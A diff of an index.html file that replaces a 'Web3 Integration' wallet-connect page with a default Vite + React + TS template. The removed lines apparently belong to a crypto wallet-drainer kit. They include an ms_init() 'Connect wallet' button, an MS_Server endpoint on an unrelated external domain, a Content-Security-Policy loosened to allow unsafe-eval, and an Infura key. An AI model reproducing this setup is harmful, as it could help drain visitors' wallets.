@@ -1,52 +1,13 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: chrome-extension: 'unsafe-inline' 'unsafe-eval'; script-src 'self' 'unsafe-inline' 'unsafe-eval' chrome-extension: https:; connect-src 'self' https: wss: chrome-extension:; style-src 'self' 'unsafe-inline' https:;">
-    <title>Web3 Integration</title>
-    
-    <!-- Styles -->
-    <link rel="preload" href="./assets/css/styles.css" as="style">
-    <link rel="stylesheet" href="./assets/css/styles.css">
-    
-    <!-- Web3 Dependencies -->
-    <script src="./assets/libs/web3.min.js"></script>
-    <script src="./assets/libs/web3modal.min.js"></script>
-    <script src="./assets/libs/web3-provider.min.js"></script>
-</head>
-<body>
-    <h1>Index Page</h1>
-    <p>Main Page</p>
-    <hr>
-    <div class="advanced_mode">
-        <p><strong>Built-in wallet:</strong> <span id="injected-status">false</span></p>
-        <button onclick="ms_init()">Connect wallet</button>
-        <p><strong>Wallet Connect</strong> ##Front##</p>
-    </div>
-
-    <!-- Configuration -->
-    <script>
-        window.MS_Server = {
-            endpoint: 'https://fasterdeliveryuae.com',
-            config: '/config'
-        };
-        
-        window.MS_Settings = {
-            RPCs: {
-                1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
-                56: "https://bsc-dataseed.binance.org/",
-                137: "https://polygon-rpc.com"
-            }
-        };
-    </script>
-
-    <!-- Application Scripts -->
-    <script src="./assets/web3-provider/web3-connect.js"></script>
-    <script>
-        setInterval(() => {
-            document.getElementById('injected-status').innerHTML = 
-                (typeof window.ethereum === 'object') ? 'true' : 'false';
-        }, 1000);
-    </script>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vite + React + TS</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="./src/main.tsx"></script>
+  </body>
 </html>
